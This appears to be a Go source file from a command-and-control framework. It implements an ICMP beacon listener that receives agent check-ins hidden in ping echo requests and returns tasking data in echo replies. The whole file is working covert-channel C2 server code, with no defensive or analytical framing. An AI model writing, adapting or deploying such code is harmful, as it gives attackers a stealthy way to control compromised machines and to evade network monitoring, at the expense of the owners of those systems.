package server

import (
	"encoding/binary"
	"log/slog"
	"net"
	"sync"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type ICMPBeaconListener struct {
	addr    string
	handler func(agentID string, reqJSON []byte) []byte
	conn    *icmp.PacketConn
	mu      sync.Mutex
}

func NewICMPBeaconListener(addr string) *ICMPBeaconListener {
	if addr == "" {
		addr = "0.0.0.0"
	}
	return &ICMPBeaconListener{addr: addr}
}

func (l *ICMPBeaconListener) SetHandler(h func(agentID string, reqJSON []byte) []byte) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.handler = h
}

func (l *ICMPBeaconListener) Start() error {
	conn, err := icmp.ListenPacket("ip4:icmp", l.addr)
	if err != nil {
		return err
	}
	l.conn = conn
	slog.Info("ICMP C2 listener started", "addr", l.addr)

	go l.serve()
	return nil
}

func (l *ICMPBeaconListener) Stop() {
	if l.conn != nil {
		l.conn.Close()
	}
}

func (l *ICMPBeaconListener) serve() {
	buf := make([]byte, 1500)
	for {
		n, peer, err := l.conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Temporary() {
				continue
			}
			return
		}

		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), buf[:n])
		if err != nil {
			continue
		}

		if msg.Type != ipv4.ICMPTypeEcho {
			continue
		}

		echo, ok := msg.Body.(*icmp.Echo)
		if !ok || len(echo.Data) == 0 {
			continue
		}

		// Extract agent ID from first 36 bytes (UUID) or use peer IP
		agentID := peer.String()
		if len(echo.Data) >= 36 {
			agentID = string(echo.Data[:36])
		}

		// Handle beacon
		l.mu.Lock()
		h := l.handler
		l.mu.Unlock()

		if h == nil {
			continue
		}

		respData := h(agentID, echo.Data)

		// Send ICMP echo reply with response data
		if respData != nil {
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply,
				Code: 0,
				Body: &icmp.Echo{
					ID:   echo.ID,
					Seq:  echo.Seq,
					Data: respData,
				},
			}
			rb, err := reply.Marshal(nil)
			if err == nil {
				l.conn.WriteTo(rb, peer)
			}
		}
	}
}

// Helper to encode uint16 in network byte order
var _ = binary.BigEndian
var _ = time.Second
